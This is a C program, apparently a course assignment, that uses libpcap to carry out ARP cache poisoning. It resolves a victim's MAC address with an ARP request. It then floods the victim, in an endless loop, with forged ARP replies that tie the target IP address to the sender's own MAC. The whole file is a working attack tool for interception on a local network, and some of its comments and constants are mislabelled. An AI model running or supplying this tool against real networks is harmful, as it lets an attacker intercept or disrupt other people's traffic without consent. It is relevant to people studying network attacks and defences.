#include <pcap.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ether.h>
#include <netinet/ip.h>
#include <net/if.h>

#define ETH_HW_ADDR_LEN 6
#define IP_ADDR_LEN     4
#define ARP_FRAME_TYPE  0x0806
#define ETHER_HW_TYPE   1
#define IP_PROTO_TYPE   0x0800
#define OP_ARP_REQUEST  2

struct arp_header {
    uint16_t        ar_hrd; /* format of hardware address */
    uint16_t        ar_pro; /* format of protocol address */
    uint8_t         ar_hln; /* length of hardware address (ETH_ADDR_LEN) */
    uint8_t         ar_pln; /* length of protocol address (IP_ADDR_LEN) */
    uint16_t        ar_op;
    uint8_t         ar_sha[6];   /* sender hardware address */
    uint32_t         ar_spa;    /* sender protocol address */
    uint8_t         ar_tha[6];   /* target hardware address */
    uint32_t         ar_tpa;    /* target protocol address */
}__attribute__((packed));


int sendArpReq(pcap_t *fp, char* interface, char* target){

    int i = 0, length = 0, offset = 0;
    int sock;
    char address[32] = { 0, };
    u_char tmp[42];
    u_char *mymac;

    struct ifreq ifr;
    struct in_addr targetip;
    struct ether_header eh;
    struct arp_header ah;
    struct sockaddr_in *aptr;

    if((sock=socket(AF_UNIX, SOCK_DGRAM, 0))<0){
        perror("socket error");
        return 1;
    }

    strcpy(ifr.ifr_name, interface);
    if(ioctl(sock, SIOCGIFHWADDR, &ifr)<0){
        perror("ioctl(REQ, HW) error");
        return 1;
    }

    mymac = ifr.ifr_hwaddr.sa_data;
    printf("My MAC : %02x:%02x:%02x:%02x:%02x:%02x\n",
           mymac[0], mymac[1], mymac[2], mymac[3], mymac[4], mymac[5]);

    // Dhost -> Destination , Shost -> My MAC
    for(i = 0; i < 6; i++){
        eh.ether_dhost[i] = 0xff;
        eh.ether_shost[i] = mymac[i];
    }
    eh.ether_type = htons(0x0806);  // Ethernet type : ARP(0x0806)

    ah.ar_hrd = htons(0x0001); // Hardware type : Ethernet(0x0001)
    ah.ar_pro = htons(0x0800); // Protocol type : IPv4(0x0800)
    ah.ar_hln = 6;             // Hardware size : 6
    ah.ar_pln = 4;             // Protocol size : 4
    ah.ar_op = htons(0x0001);  // Opcode(Req)   : 1

    for(i = 0; i < 6; i++){
        ah.ar_tha[i] = 0x00;
        ah.ar_sha[i] = mymac[i];
    }

    if((sock=socket(AF_INET, SOCK_DGRAM, 0))<0){
        perror("socket error");
        return 1;
    }

    if (ioctl(sock, SIOCGIFADDR, &ifr)<0) {
        perror("ioctl(REQ, IP) error");
        return 1;
    }

    aptr = (struct sockaddr_in *)&ifr.ifr_addr;
    inet_ntop(AF_INET, &aptr->sin_addr, address, 32);
    ah.ar_spa = aptr->sin_addr.s_addr;

    inet_aton(target, &targetip.s_addr);
    ah.ar_tpa = targetip.s_addr; // sender

    length = sizeof(struct ether_header);
    offset += length;
    memcpy(tmp, &eh, length);
    length = sizeof(struct arp_header);
    memcpy(tmp+offset, &ah, length);

    if(pcap_sendpacket(fp, tmp, 42)!=0){
        fprintf(stderr, "sendpacket_error\n");
        return 1;
    }
    return 0;
}

int sendArpRepl(pcap_t *fp, u_int8_t* sMAC, u_int8_t* dMAC, char* source, char* target){

    int i = 0, length = 0, offset = 0;
    u_char tmp[42];

    struct in_addr targetip;
    struct in_addr srcip;
    struct ether_header eh;
    struct arp_header ah;

    // Dhost -> Destination , Shost -> My MAC
    for(i = 0; i < 6; i++){
        eh.ether_dhost[i] = dMAC[i];
        eh.ether_shost[i] = sMAC[i];
    }

    eh.ether_type = htons(0x0806);  // Ethernet type : ARP(0x0806)

    ah.ar_hrd = htons(0x0001); // Hardware type : Ethernet(0x0001)
    ah.ar_pro = htons(0x0800); // Protocol type : IPv4(0x0800)
    ah.ar_hln = 6;             // Hardware size : 6
    ah.ar_pln = 4;             // Protocol size : 4
    ah.ar_op = htons(0x0002);  // Opcode(Req)   : 1

    for(i = 0; i < 6; i++){
        ah.ar_tha[i] = dMAC[i];
        ah.ar_sha[i] = sMAC[i];
    }

    inet_aton(source, &srcip.s_addr);
    ah.ar_spa = srcip.s_addr;

    inet_aton(target, &targetip.s_addr);
    ah.ar_tpa = targetip.s_addr; // sender

    length = sizeof(struct ether_header);
    offset += length;
    memcpy(tmp, &eh, length);
    length = sizeof(struct arp_header);
    memcpy(tmp+offset, &ah, length);

    if(pcap_sendpacket(fp, tmp, 42)!=0){
        fprintf(stderr, "sendpacket_error\n");
        return 1;
    }
    return 0;
}


int main(int argc, char *argv[]){

        int i = 0;
        int res;
        int offset = 14;
        char errbuf[PCAP_ERRBUF_SIZE];
        const unsigned char *pkt_data;

        struct pcap_pkthdr *header;
        struct ether_header *eth;
        struct arp_header *arp;

        pcap_t *fp;
        u_int8_t sMAC[6];

        if(argc != 4){
            printf("Usage : AS3 <interface> <sender ip> <target ip>\n");
            exit(1);
        }

        if((fp = pcap_open_live(argv[1], 65536, 1, 0, errbuf)) == NULL){
                printf("[!] Packet descriptor Error!!!\n");
                perror(errbuf);
                printf("[!] EXIT process\n");
                exit(0);
        }

        sendArpReq(fp, argv[1], argv[2]);

        while(1){
            res = pcap_next_ex(fp, &header, &pkt_data);
            if (res == 0 || pkt_data == NULL){
                if (sendArpReq(fp, argv[1], argv[2]) != 0){
                    fprintf(stderr,"\nError sending the packet: %s\n", pcap_geterr(fp));
                    return -1;
                }
                sleep(1);
                continue;
            }
            if (res == -1 || res == -2){
                printf("[!] EXIT process\n");
                break;
            }

            eth = pkt_data;
            arp = pkt_data+offset;

            if((ntohs(eth->ether_type) == 0x0806) && (ntohs(arp->ar_op) == 0x0002)){
                for(i = 0; i < 6; i++) sMAC[i] = eth->ether_shost[i];
                printf("Get SMAC\n");
                printf("Sender MAC : %02x:%02x:%02x:%02x:%02x:%02x\n", sMAC[0], sMAC[1], sMAC[2], sMAC[3], sMAC[4],sMAC[5]);
                break;
            }
        }

        i = 0;
        while(1){
            printf("Send ARP reply Packet! %d\n", i);
            // int sendArpRepl(pcap_t *fp, u_int8_t* sMAC, u_int8_t* dMAC, char* source, char* target)
            sendArpRepl(fp, eth->ether_dhost, eth->ether_shost, argv[3], argv[2]);
        }

        return 0;
}
